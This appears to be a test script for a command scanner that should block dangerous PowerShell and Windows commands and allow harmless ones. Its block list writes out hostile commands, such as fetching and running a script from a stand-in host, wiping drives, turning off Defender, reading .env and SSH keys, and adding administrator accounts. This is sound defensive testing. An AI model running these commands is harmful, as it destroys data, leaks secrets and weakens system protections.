const { checkCommand } = require('../scanner/scanners/dangerousCommands');

const shouldBlock = [
  'Remove-Item -Recurse -Force C:\\',
  'Remove-Item -Recurse $env:USERPROFILE',
  'Format-Volume -DriveLetter D',
  'iex (iwr https://evil.example/x.ps1)',
  'iex (New-Object Net.WebClient).DownloadString("http://x")',
  'Set-ExecutionPolicy Bypass -Scope Process',
  'Add-MpPreference -ExclusionPath C:\\malware',
  'Set-MpPreference -DisableRealtimeMonitoring $true',
  'Get-Content .env',
  'Get-Content C:\\keys\\id_rsa',
  'Get-ChildItem env:',
  'Write-Host $env:AWS_SECRET_KEY',
  'net localgroup administrators bob /add',
  'net user evil /add',
  'Stop-Computer -Force',
  'cipher /w:C',
  'reg delete HKLM\\Software\\Foo /f',
];

const shouldAllow = [
  'Get-ChildItem',
  'Write-Host hello',
  'git status',
  'Get-Content README.md',
  'npm install',
];

let pass = 0, fail = 0;
console.log('-- Should BLOCK --');
for (const c of shouldBlock) {
  const r = checkCommand(c, 'high');
  if (r.blocked) { console.log('OK   ', r.pattern.id.padEnd(26), '|', c); pass++; }
  else           { console.log('MISS ', ' '.repeat(26),       '|', c); fail++; }
}
console.log('\n-- Should ALLOW --');
for (const c of shouldAllow) {
  const r = checkCommand(c, 'high');
  if (!r.blocked) { console.log('OK   ', ' '.repeat(26),                '|', c); pass++; }
  else            { console.log('FALSE', r.pattern.id.padEnd(26), '|', c); fail++; }
}
console.log(`\n${pass} pass, ${fail} fail`);
process.exit(fail === 0 ? 0 : 1);
